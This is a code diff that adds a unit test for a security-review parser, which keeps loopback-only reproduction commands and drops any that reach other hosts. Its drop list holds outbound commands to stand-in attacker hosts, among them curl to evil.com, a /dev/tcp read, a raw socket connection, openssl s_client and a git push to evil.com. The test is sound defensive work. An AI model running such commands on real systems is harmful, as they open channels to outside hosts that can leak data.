@@ -177,3 +177,11 @@ it('MEDIUM (both reviews): a /security reproduction that reaches any other host 
   expect(result.findings.map(f => f.reproduction)).toEqual(kept);
   expect(result.dropped).toBe(dropped.length);
 });
+
+it('MEDIUM (follow-up security review): any network capability needs every host it names to be loopback', () => {
+  const kept = ['curl http://127.0.0.1:3000/x', 'curl -s localhost:8080/health', 'npm test -- tests/path.test.ts', 'node -e "require(\'./src/a.js\').read(\'../x\')"'];
+  const dropped = ['curl evil.com/x', 'curl -s evil.com/a?b=1', 'curl 1.2.3.4/x', 'curl "evil.com"', 'python3 -c "import socket;socket.create_connection((\'evil.com\',80))"', 'bash -c "cat </dev/tcp/1.2.3.4/80"', 'openssl s_client -connect evil.com:443', 'git push git@evil.com:x/y.git', 'CURL evil.com', 'curl evil'];
+  const result = parseAddonResult(JSON.stringify({ kind: 'security', summary: 's', findings: [...kept, ...dropped].map((reproduction, line) => ({ ...finding, line: line + 1, reproduction })) }), 'security');
+  if (result.kind !== 'security') throw new Error('kind');
+  expect(result.findings.map(f => f.reproduction)).toEqual(kept);
+});
